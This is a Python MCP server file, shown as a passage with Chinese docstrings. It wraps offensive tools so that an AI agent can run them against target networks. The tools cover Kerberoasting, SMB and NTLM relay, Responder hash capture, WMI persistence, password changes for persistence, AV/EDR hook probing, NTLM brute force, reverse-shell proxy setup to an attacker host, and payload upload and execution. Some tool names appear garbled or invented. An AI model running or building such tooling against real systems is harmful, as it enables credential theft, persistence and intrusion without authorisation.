    :param domain: 域名 (如 'corp.local')。
    :param dc_ip: 域控制器 IP。
    :param auth_uri: 认证信息 (格式 'domain/user:pass' 或 'domain/user@dc_ip')。
    :param filter: LDAP 搜索过滤器 (默认 '(objectClass=user)')。
    :param attributes: 要查询的属性列表 (如 'sAMAccountName,mail,memberOf')。
    :param args: 附加参数。
    """
    command = ["ldapsearch.py"]
    command.append(f"-dc-hosts={dc_ip}")
    if auth_uri:
        command.append(auth_uri)
    else:
        command.append(domain)
    command.extend(["-query", f'"{filter}"'])
    if attributes:
        command.extend(["-attributes", attributes])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_smbpasswd(auth_uri: str, new_password: str = "", args: str = "") -> str:
    """
    使用 smbpasswd.py 修改 SMB 用户的密码。
    适用场景：获取某个账号后，想修改密码维持权限或进行持久化。
    
    :param auth_uri: 当前认证信息，格式为 'domain/username:password@target'。
    :param new_password: 新密码。
    :param args: 附加参数 (如 '-newhashes :NEWNTHASH')。
    """
    command = ["smbpasswd.py"]
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    if new_password:
        command.append(new_password)
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_potentialapis(auth_uri: str = "", target: str = "", mode: str = "enum",
                               args: str = "") -> str:
    """
    使用 potentialapis.py 枚举或注入潜在的 API_HOOK 检测。
    适用场景：检测杀软/EDR 的 API Hooking 状态，辅助免杀或后门部署。
    
    :param auth_uri: 认证信息 (格式 'domain/user:pass@target')。
    :param target: 目标主机 (如果 auth_uri 未包含)。
    :param mode: 操作模式 - 'enum' (枚举) / 'inject' (注入检测)。
    :param args: 附加参数。
    """
    command = ["potentialapis.py"]
    if auth_uri:
        command.append(auth_uri)
    elif target:
        command.append(target)
    command.extend(["-mode", mode])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_wmipersist(auth_uri: str, trigger: str = "logon", action: str = "",
                             exe_path: str = "", args: str = "") -> str:
    """
    使用 wmipersist.py 利用 WMI 订阅者/事件进行持久化。
    适用场景：在目标机器上建立 WMI 事件订阅实现权限维持。
    
    :param auth_uri: 认证信息，格式为 'domain/user:pass@target'。
    :param trigger: 触发条件 - 'logon' / 'boot' / 'periodic'。
    :param action: 要执行的动作 (如 'notepad.exe' 或 'powershell -enc ...')。
    :param exe_path: 恶意程序路径。
    :param args: 附加参数。
    """
    command = ["wmipersist.py"]
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    command.extend(["-trigger", trigger])
    if action:
        command.extend(["-action", action])
    if exe_path:
        command.extend(["-exe", exe_path])
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_rubeus(domain: str, user: str = "", password: str = "",
                        hash: str = "", action: str = "ask", target_spnb: str = "",
                        ticket: str = "", args: str = "") -> str:
    """
    使用 Rubeus.exe 进行 Kerberos 相关攻击 (AS-REP Roasting / Kerberoasting / TGT 伪造等)。
    适用场景：在 Windows 机器上执行 Kerberos 攻击，支持多种攻击模式。
    注意：需要先上传 Rubeus.exe 到目标机器。
    
    :param domain: 域名。
    :param user: 用户名。
    :param password: 密码。
    :param hash: 密码哈希 (格式 ':NTHASH')。
    :param action: 攻击类型 - 'ask' (AS-REQ) / 'kerberoast' / 'tgt' / 'ptt' (Pass-the-Ticket) / 'purge'。
    :param target_spnb: Kerberoasting 的目标 SPN。
    :param ticket: Base64 编码的票据 (用于 PTT)。
    :param args: 附加参数。
    """
    command = ["Rubeus.exe"]
    command.extend(["/domain", domain])
    if user:
        command.extend(["/user", user])
    if password:
        command.extend(["/password", password])
    if hash:
        command.extend(["/hashes", hash.replace(":", "")])  # Rubeus 格式
    command.extend(["/action", action])
    if target_spnb:
        command.extend(["/spn", target_spnb])
    if ticket:
        command.extend(["/ticket", ticket])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_egghunter(auth_uri: str = "", payload: str = "", payload_type: str = "calc",
                            encoders: str = "", args: str = "") -> str:
    """
    使用 egghunter.py 生成 egghunter shellcode 用于在内存中搜索标记的 shellcode 并执行。
    适用场景：当 shellcode 较大无法直接填充时，利用 egghunter 定位并执行 shellcode。
    
    :param auth_uri: 认证信息 (格式 'domain/user:pass@target')。
    :param payload: 要搜索的 shellcode 标签 (默认 'egg')。
    :param payload_type: payload 类型 (用于生成测试 shellcode)。
    :param encoders: 编码器。
    :param args: 附加参数。
    """
    command = ["egghunter.py"]
    if args:
        command.extend(shlex.split(args))
    if payload:
        command.extend(["-egg", payload])
    if payload_type:
        command.extend(["-payload", payload_type])
    if encoders:
        command.extend(["-encoders", encoders])
    return await run_command_with_timeout(command, timeout=30)

@mcp.tool()
async def invoke_smbrelayx(targets: str = "", mode: str = "server", inject: str = "",
                            exe_path: str = "", args: str = "") -> str:
    """
    使用 smbrelayx.py 执行 SMB 中继攻击 (监听 SMB 连接并中继到其他目标)。
    适用场景：结合 Responder 或独立使用，将 SMB 哈希中继到其他机器获取权限。
    
    :param targets: 目标列表文件。
    :param mode: 模式 - 'server' (监听) / 'relay' (中继)。
    :param inject: 要执行的命令或代码。
    :param exe_path: 要上传执行的程序路径。
    :param args: 附加参数。
    """
    command = ["smbrelayx.py"]
    if targets:
        if os.path.exists(targets):
            command.extend(["-tf", targets])
        else:
            command.extend(["-t", targets])
    command.extend(["-mode", mode])
    if inject:
        command.extend(["-e", inject])
    if exe_path:
        command.extend(["-c", exe_path])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=300)

@mcp.tool()
async def invoke_mqtt_troll(mqtt_server: str = "", topic: str = "", payload: str = "",
                            auth_uri: str = "", args: str = "") -> str:
    """
    使用 mqtt_troll.py 发送伪造的 MQTT 消息或订阅 MQTT 主题进行数据嗅探。
    适用场景：IoT/工控环境中测试 MQTT 协议安全。
    
    :param mqtt_server: MQTT broker 地址。
    :param topic: MQTT 主题。
    :param payload: 要发送的消息内容。
    :param auth_uri: 认证信息 (用户名:密码)。
    :param args: 附加参数。
    """
    command = ["mqtt_troll.py"]
    if mqtt_server:
        command.extend(["-server", mqtt_server])
    if topic:
        command.extend(["-topic", topic])
    if payload:
        command.extend(["-data", payload])
    if auth_uri:
        command.extend(["-auth", auth_uri])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_journal_export(auth_uri: str, export_path: str = "", args: str = "") -> str:
    """
    使用 windows.journal.py 读取 Windows 事件日志 (.evtx 文件)。
    适用场景：从目标机器或 dump 的内存中解析事件日志，寻找攻击痕迹或凭据线索。
    
    :param auth_uri: 认证信息 (格式 'domain/user:pass@target')。
    :param export_path: 导出文件路径。
    :param args: 附加参数。
    """
    command = ["windows.journal.py"]
    if args:
        command.extend(shlex.split(args))
    command.append(auth_uri)
    if export_path:
        command.extend(["-o", export_path])
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_split(img1: str, img2: str, args: str = "") -> str:
    """
    使用 split.pcap.py 将 pcap 文件按流分割。
    适用场景：分析大 pcap 文件时将其分割为多个小文件。
    
    :param img1: 输入的 pcap/pcapng 文件路径。
    :param img2: 输出目录或前缀。
    :param args: 附加参数。
    """
    command = ["split.pcap.py", img1]
    if img2:
        command.append(img2)
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_pcap_analytics(pcap_file: str, extract_creds: bool = True,
                                extract_files: bool = False, args: str = "") -> str:
    """
    使用 pacpanalytics.py 分析 pcap 文件，提取认证信息和文件。
    适用场景：从网络流量中提取明文凭据、HTTP 上传文件等。
    
    :param pcap_file: pcap 文件路径。
    :param extract_creds: 是否提取认证信息。
    :param extract_files: 是否提取传输文件。
    :param args: 附加参数。
    """
    command = ["pcapanalytics.py", pcap_file]
    if extract_creds:
        command.append("-creds")
    if extract_files:
        command.append("-extract-files")
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_pdump(thrift_file: str = "", protocol: str = "", mode: str = "dump",
                       args: str = "") -> str:
    """
    使用 pandump.py 解析 Pandora SDK 协议的流量文件 (thrift)。
    适用场景：分析特定工控/IoT 协议的流量。
    
    :param thrift_file: Thrift 协议定义文件。
    :param protocol: 协议名称。
    :param mode: 模式 - 'dump' (解析) / 'fuzz' (模糊测试)。
    :param args: 附加参数。
    """
    command = ["pandump.py"]
    if thrift_file:
        command.extend(["-f", thrift_file])
    if protocol:
        command.extend(["-protocol", protocol])
    command.append(f"-mode={mode}")
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_sniff(interface: str = "eth0", filter: str = "", count: int = 0,
                       output_file: str = "", args: str = "") -> str:
    """
    使用 sniffer.py 进行网络流量嗅探。
    适用场景：抓取网络流量发现明文凭据或敏感通信。
    
    :param interface: 监听的网络接口。
    :param filter: BPF 过滤表达式。
    :param count: 抓包数量 (0 为无限)。
    :param output_file: 输出 pcap 文件路径。
    :param args: 附加参数。
    """
    command = ["sniffer.py"]
    command.extend(["-i", interface])
    if filter:
        command.extend(["-filter", filter])
    if count > 0:
        command.extend(["-c", str(count)])
    if output_file:
        command.extend(["-o", output_file])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_ping(target: str, count: int = 4, timeout: int = 5, args: str = "") -> str:
    """
    使用 ping.py 发送 ICMP ping 检测主机存活。
    适用场景：检测目标是否在线。
    
    :param target: 目标 IP 或主机名。
    :param count: ping 次数。
    :param timeout: 超时秒数。
    :param args: 附加参数。
    """
    command = ["ping.py", target, "-c", str(count), "-w", str(timeout)]
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def invoke_tcpdump(interface: str = "eth0", filter: str = "", count: int = 100,
                         output_file: str = "", args: str = "") -> str:
    """
    使用 tcpsniff.py 监听 TCP 流量并提取数据。
    适用场景：中间人嗅探或分析特定 TCP 连接。
    
    :param interface: 监听的网络接口。
    :param filter: BPF 过滤表达式。
    :param count: 最大数据包数量。
    :param output_file: 输出文件路径。
    :param args: 附加参数。
    """
    command = ["tcpsniff.py"]
    command.extend(["-i", interface])
    if filter:
        command.extend(["-filter", filter])
    if count > 0:
        command.extend(["-c", str(count)])
    if output_file:
        command.extend(["-o", output_file])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_ngioauthblaster(target: str, port: int = 445, auth_type: str = "ntlm",
                                 users: str = "", passwords: str = "", args: str = "") -> str:
    """
    使用 ntlmrelayx-ngioauthblaster.py 暴力破解 NTLM 认证。
    适用场景：对 SMB/HTTP NTLM 认证进行暴力破解测试。
    
    :param target: 目标主机。
    :param port: 端口 (默认 445)。
    :param auth_type: 认证类型 (ntlm/kerberos)。
    :param users: 用户名列表文件。
    :param passwords: 密码列表文件。
    :param args: 附加参数。
    """
    command = ["ngioauthblaster.py", target, "-port", str(port), "-authType", auth_type]
    if users:
        command.extend(["-users", users])
    if passwords:
        command.extend(["-passwords", passwords])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=600)

@mcp.tool()
async def invoke_esentutlparse(db_file: str, output_dir: str = "", args: str = "") -> str:
    """
    使用 esentutl.py 解析 ESE (Extensible Storage Engine) 数据库文件。
    适用场景：从 Windows 索引服务、Exchange邮箱、DHCP 数据库等 ESE 文件提取数据。
    
    :param db_file: ESE 数据库文件路径 (.edb/.mdb)。
    :param output_dir: 输出目录。
    :param args: 附加参数。
    """
    command = ["esentutl.py", db_file]
    if output_dir:
        command.extend(["-o", output_dir])
    if args:
        command.extend(shlex.split(args))
    return await run_command_with_timeout(command, timeout=120)

@mcp.tool()
async def invoke_misc(mcp, command_name: str, args_str: str = "") -> str:
    """
    执行其他未单独封装的 impacket 工具脚本。
    适用场景：执行服务器上已安装但 MCP 未封装的 impacket 工具。
    
    :param command_name: impacket 命令名 (如 'karmaSMB'、'getArch'、'ntfs-read' 等)。
    :param args_str: 命令参数 (完整参数字符串)。
    """
    import shutil
    tool_path = shutil.which(command_name)
    if not tool_path:
        return f"执行失败: 找不到 impacket 工具 '{command_name}'，请确认已安装 impacket。"
    cmd_list = [command_name]
    if args_str:
        cmd_list.extend(shlex.split(args_str))
    return await run_command_with_timeout(cmd_list, timeout=120)

@mcp.tool()
async def invoke_playwright_browse(url: str, action: str = "info", js_code: str = "", wait_time: int = 5, screenshot_path: str = "") -> str:
    """
    使用 Playwright 无头浏览器访问目标页面，读取 JavaScript 动态渲染后的完整信息。
    与 httpx 的区别：httpx 只能获取原始 HTTP 响应，Playwright 会真正执行 JS、渲染 DOM、保留 Cookie 和 LocalStorage。
    适用场景：SPA 单页应用信息提取、需要 JS 渲染的后台管理页面、提取 Cookie/Token、登录表单发现、动态加载的 API 端点发现。
    
    :param url: 目标 URL (如 'http://10.10.26.107:8080' 或 'https://target.com/admin')。
    :param action: 操作类型 - "info" (综合信息:标题/Cookie/表单/链接/Meta), "content" (页面纯文本), "html" (完整HTML), "screenshot" (截图保存), "js" (执行自定义JavaScript)。
    :param js_code: 当 action="js" 时要执行的 JavaScript 代码 (如 'document.cookie' 或 'JSON.stringify(localStorage)')。
    :param wait_time: 页面加载后额外等待秒数，用于等待 JS 异步渲染完成（默认 5 秒）。
    :param screenshot_path: action="screenshot" 时截图保存路径，留空则自动生成时间戳命名。
    """
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return "执行失败: playwright 未安装。请运行 'pip install playwright && playwright install chromium'。"

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                ignore_https_errors=True,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
            page = await context.new_page()

            try:
                await page.goto(url, wait_until="domcontentloaded", timeout=30000)
            except Exception as nav_err:
                await browser.close()
                return f"页面导航失败: {str(nav_err)}"

            if wait_time > 0:
                await asyncio.sleep(wait_time)

            result = ""

            if action == "info":
                title = await page.title()
                current_url = page.url
                cookies = await context.cookies()

                forms = await page.evaluate("""() => {
                    return Array.from(document.forms).map(f => ({
                        action: f.action, method: f.method,
                        inputs: Array.from(f.elements).map(e => ({name: e.name, type: e.type})).filter(e => e.name)
                    }))
                }""")

                links = await page.evaluate("""() => {
                    return Array.from(document.querySelectorAll('a[href]'))
                        .map(a => ({text: a.textContent.trim().substring(0, 60), href: a.href}))
                        .filter(l => l.href && !l.href.startsWith('javascript:'))
                        .slice(0, 50)
                }""")

                meta = await page.evaluate("""() => {
                    return Array.from(document.querySelectorAll('meta'))
                        .map(m => ({name: m.name || m.httpEquiv || m.getAttribute('property'), content: m.content}))
                        .filter(m => m.name && m.content)
                }""")

                scripts_src = await page.evaluate("""() => {
                    return Array.from(document.querySelectorAll('script[src]'))
                        .map(s => s.src).slice(0, 30)
                }""")

                output = [f"=== Playwright 页面综合信息: {url} ==="]
                output.append(f"页面标题: {title}")
                output.append(f"最终URL: {current_url}")

                output.append(f"\n--- Cookies ({len(cookies)}) ---")
                for c in cookies:
                    output.append(f"  {c['name']}={c['value'][:80]} (domain={c['domain']}, httpOnly={c.get('httpOnly', False)}, secure={c.get('secure', False)})")

                output.append(f"\n--- 表单 ({len(forms)}) ---")
                for f in forms:
                    output.append(f"  [Form] action={f['action']} method={f['method']}")
                    for inp in f.get('inputs', []):
                        output.append(f"    <input name='{inp['name']}' type='{inp['type']}'>")

                output.append(f"\n--- 链接 (前50) ---")
                for lnk in links:
                    output.append(f"  [{lnk['text'][:40]}] -> {lnk['href']}")

                output.append(f"\n--- Meta 标签 ({len(meta)}) ---")
                for m in meta:
                    output.append(f"  {m['name']}: {m['content'][:100]}")

                output.append(f"\n--- 外部脚本 ({len(scripts_src)}) ---")
                for src in scripts_src:
                    output.append(f"  {src}")

                result = "\n".join(output)

            elif action == "content":
                result = await page.inner_text("body")
                if len(result) > 50000:
                    result = result[:50000] + f"\n... [内容截断，总计 {len(result)} 字符]"

            elif action == "html":
                result = await page.content()
                if len(result) > 50000:
                    result = result[:50000] + f"\n... [HTML 截断，总计 {len(result)} 字符]"

            elif action == "screenshot":
                if not screenshot_path:
                    import time
                    screenshot_path = f"screenshot_{int(time.time())}.png"
                await page.screenshot(path=screenshot_path, full_page=True)
                result = f"截图已保存至: {screenshot_path}"

            elif action == "js":
                if not js_code:
                    result = "错误: action='js' 时必须提供 js_code 参数。\n常用示例:\n  document.cookie\n  JSON.stringify(localStorage)\n  document.querySelectorAll('input[type=hidden]').length"
                else:
                    js_result = await page.evaluate(js_code)
                    result = f"JavaScript 执行结果:\n{js_result}"

            else:
                result = f"未知 action '{action}'。支持: info / content / html / screenshot / js"

            await browser.close()
            return result

    except Exception as e:
        return f"Playwright 执行失败: {str(e)}"


@mcp.tool()
async def invoke_ntlmrelayx(target: str, listen_time: int = 60, args: str = "") -> str:
    """
    非阻塞式收集：启动 ntlmrelayx.py 进行 NTLM Relay 攻击。
    说明：由于这是被动式监听工具，传统的终端运行会永远阻塞。此 Tool 会让该进程后台执行限定的时长 (listen_time 秒)，
    随后强制停止并返回这段时间内所有的终端日志以便 AI 研判。
    在此监听期间，你可以调度其他 Tool (如 responder) 或执行 Web 请求来触发 NTLM 认证。
    
    :param target: 收到 NTLM 认证后要中继转发到达的【目标 IP 或 URL】(例如 'smb://192.168.1.20' 或 'ldap://192.168.1.10')。
    :param listen_time: 工具持续挂机监听的时间 (秒)，超时将中止并回传结果。
    :param args: 附加指令 (例如 '-smb2support' 或 '-c "whoami"' 中继后执行的系统命令，或 ' -i ' 开启交互)。
    """
    command = ["ntlmrelayx.py", "-t", target]
    if args:
        command.extend(shlex.split(args))
        
    return await run_command_with_timeout(command, timeout=listen_time)

@mcp.tool()
async def invoke_proxy_setup(tool: str, target_ip: str, target_port: int, listen_port: int,
                            os_type: str = "windows") -> str:
    """
    自动化生成代理搭建方案，支持 chisel、netcat、PowerShell 等代理工具。
    适用场景：当你在靶场渗透中获得了一台内网主机的权限，需要将其作为跳板访问其他网段时，
    可以使用此工具生成代理搭建方案。它会自动读取工具的二进制文件、生成 Base64 编码、
    提供上传命令和执行指令，让 AI 能够一键完成代理搭建！

    :param tool: 代理工具类型 (chisel / nc / powershell)。
                 - chisel: 高性能 HTTP over TCP 隧道，支持端口转发（推荐）
                 - nc: 传统 Netcat 简单反向 shell
                 - powershell: 纯 PowerShell 反向 shell（无工具上传）
    :param target_ip: 攻击者 VPS 或公网 IP（目标机器会连接此 IP）。
                      如果是反向代理，此 IP 用于目标机器连接。
    :param target_port: 攻击者监听的端口（目标机器会连接此端口）。
    :param listen_port: chisel 在目标机器上监听的端口（仅 chisel 需要）。
    :param os_type: 目标操作系统类型 (windows / linux)，默认 windows。
    """
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy_setup.py")

    if not os.path.exists(script_path):
        return f"执行失败: 找不到 proxy_setup.py"

    command = [
        sys.executable,
        script_path,
        tool,
        target_ip,
        str(target_port),
        str(listen_port),
        os_type
    ]

    return await run_command_with_timeout(command, timeout=60)

@mcp.tool()
async def upload_and_exec(target: str, username: str, password: str, local_file: str,
                         remote_path: str, exec_command: str = "", protocol: str = "smb") -> str:
    """
    上传文件到目标机器并可选执行命令。
    适用场景：代理搭建时需要将代理工具上传到目标机器，或需要上传脚本/Payload 到目标执行。
    此工具支持 SMB/FTP 等协议进行文件传输。

    :param target: 目标 IP 地址。
    :param username: 认证用户名。
    :param password: 认证密码（支持明文密码）。
    :param local_file: 本地要上传的文件路径（如 'd:\\mcp\\redteam-tools\\chisel.exe'）。
    :param remote_path: 目标机器上的保存路径（如 'C:\\Windows\\Temp\\chisel.exe'）。
    :param exec_command: 上传后要执行的命令（可选）。例如 'C:\\Windows\\Temp\\chisel.exe --help'。
    :param protocol: 传输协议 (smb / ftp)，默认 smb。
    """
    if not os.path.exists(local_file):
        return f"执行失败: 本地文件不存在: {local_file}"

    # 检查文件大小
    file_size = os.path.getsize(local_file)
    if file_size > 100 * 1024 * 1024:  # 100MB
        return f"执行失败: 文件过大 ({file_size / 1024 / 1024:.1f}MB)，请使用更小的文件"

    # 读取文件并 Base64 编码
    with open(local_file, 'rb') as f:
        file_data = f.read()
    file_base64 = base64.b64encode(file_data).decode('utf-8')
    filename = os.path.basename(local_file)

    results = []
    results.append("=" * 60)
    results.append("           文件上传与执行报告")
    results.append("=" * 60)
    results.append(f"本地文件:    {local_file}")
    results.append(f"文件大小:    {file_size / 1024:.1f} KB")
    results.append(f"目标 IP:     {target}")
    results.append(f"保存路径:    {remote_path}")
    results.append("")

    # 生成 PowerShell 上传命令
    results.append("-" * 60)
    results.append("【PowerShell Base64 上传命令】")
    results.append("-" * 50)
    results.append(f"# PowerShell 命令（在目标机器执行）:")
    results.append(f"# 注意: 将下面的 BASE64_DATA 替换为实际编码")
    results.append("")

    # 分块输出 Base64（防止过长）
    chunk_size = 200
    chunks = [file_base64[i:i+chunk_size] for i in range(0, len(file_base64), chunk_size)]

    results.append(f"# 文件 Base64 编码 (共 {len(chunks)} 块，总长度 {len(file_base64)}):")
    for i, chunk in enumerate(chunks[:10]):
        results.append(f"# 块{i+1}: {chunk}")
    if len(chunks) > 10:
        results.append(f"# ... 还有 {len(chunks) - 10} 块")

    results.append("")
    results.append("# 完整上传命令:")
    results.append("$base64 = @'")
    results.append(file_base64)
    results.append("@'")
    results.append(f"[System.IO.File]::WriteAllBytes('{remote_path}', [System.Convert]::FromBase64String($base64))")

    # 生成 FTP 上传命令（备选）
    results.append("")
    results.append("-" * 60)
    results.append("【备选: SMB 上传命令】")
    results.append("-" * 50)
    results.append(f"# 使用 impacket-smbclient:")
    results.append(f"# impacket-smbclient {username}:{password}@{target}")
    results.append(f"# put {local_file} {remote_path}")

    # 执行命令
    if exec_command:
        results.append("")
        results.append("-" * 60)
        results.append("【执行命令】")
        results.append("-" * 50)
        results.append(f"# 在目标机器上执行:")
        results.append(exec_command)

    results.append("")
    results.append("=" * 60)
    results.append("提示: 使用 nxc smb 或 wmiexec 执行上述命令")
    results.append("=" * 60)

    return "\n".join(results)


@mcp.tool()
async def invoke_powerview(domain: str, dc_ip: str, auth: str = "", args: str = "") -> str:
    """
    使用 PowerSploit 的 PowerView.py 或 pywerview 进行域信息枚举。
    适用场景：在获得域用户凭据后，枚举域用户、计算机、组、共享、策略等信息。
    PowerView 是域渗透中最重要的侦查工具之一。

    :param domain: 目标域名 (如 'corp.local')。
    :param dc_ip: 域控制器 IP 地址。
    :param auth: 认证凭据，格式 'username:password' 或 'username@domain:password'。
    :param args: pywerview 附加参数。
                 常用子命令: get-domain-user / get-domain-computer / get-domain-group /
                            get-domain-share / get-domain-gpo / get-domain-trust
    """
    # pywerview 使用方式: pywerview.py <command> -d domain -u user -p pass
    command = ["pywerview.py"]

    if not args:
        # 默认枚举域用户
        command.extend(["get-domain-user"])
    else:
        command.extend(shlex.split(args))

    if domain:
        command.extend(["-d", domain])
    if dc_ip:
        command.extend(["--dc-ip", dc_ip])
    if auth:
        if ":" in auth:
            username, password = auth.split(":", 1)
            command.extend(["-u", username, "-p", password])

    return await run_command_with_timeout(command, timeout=120)


@mcp.tool()
async def invoke_ldapdomaindump(domain: str, dc_ip: str, auth: str = "", output_dir: str = "") -> str:
    """
    使用 ldapdomaindump 转储域信息为 HTML/JSON/CSV 格式。
    适用场景：收集域内所有用户、计算机、组、策略等信息的完整快照，
    便于后续分析和生成报告。

    :param domain: 目标域名 (如 'corp.local')。
    :param dc_ip: 域控制器 IP 地址。
    :param auth: 认证凭据，格式 'username:password'。
    :param output_dir: 输出目录路径（默认当前目录）。
    """
    command = ["ldapdomaindump"]

    if dc_ip:
        command.extend(["-u", f"{domain}\\{auth.split(':')[0]}" if auth else "", "-p", auth.split(":")[1] if ":" in auth else ""])
        command.extend(["--dc", dc_ip])

    if output_dir:
        command.extend(["-o", output_dir])
    else:
        output_dir = "ldapdump_output"
        command.extend(["-o", output_dir])

    # ldapdomaindump 格式: ldapdomaindump <ldap://dc> -u 'domain\\user' -p 'password' -o output/
    full_command = [
        "python", "-m", "ldapdomaindump",
        f"ldap://{dc_ip}",
        "-u", f"{domain}\\{auth.split(':')[0]}" if auth else "",
        "-p", auth.split(":")[1] if ":" in auth else "",
        "-o", output_dir
    ]

    return await run_command_with_timeout(full_command, timeout=180)


@mcp.tool()
async def invoke_responder(listen_if: str = "", args: str = "") -> str:
    """
    启动 Responder 进行 LLMNR/NBT-NS/mDNS 欺骗和 SMB/MSRPC 哈希收集。
    适用场景：在内网中进行哈希收集，当用户输错主机名时，Responder 会拦截认证请求，
    捕获 NetNTLMv1/v2 哈希，可用于中继或离线破解。

    重要：此工具是监听型工具，需要在后台运行并设置超时。

    :param listen_if: 监听的网卡接口名称或 IP 地址（如 'eth0' 或 '192.168.1.100'）。
    :param args: 附加参数。
                 常用: -w（开启 WPAD 代理服务器）、--lm（强制 LM 哈希）、-F（强制 NTLM 认证）
    """
    command = ["responder"]

    if listen_if:
        command.extend(["-I", listen_if])
    if args:
        command.extend(shlex.split(args))

    # Responder 需要 sudo/管理员权限运行
    # 添加默认参数
    if "-w" not in args and "--wpad" not in args:
        command.append("-w")
    if "-F" not in args:
        command.append("-F")

    return await run_command_with_timeout(command, timeout=60)


if __name__ == "__main__":
    # 使用 stdio 模型运行 MCP (标准通信方式)
    mcp.run()
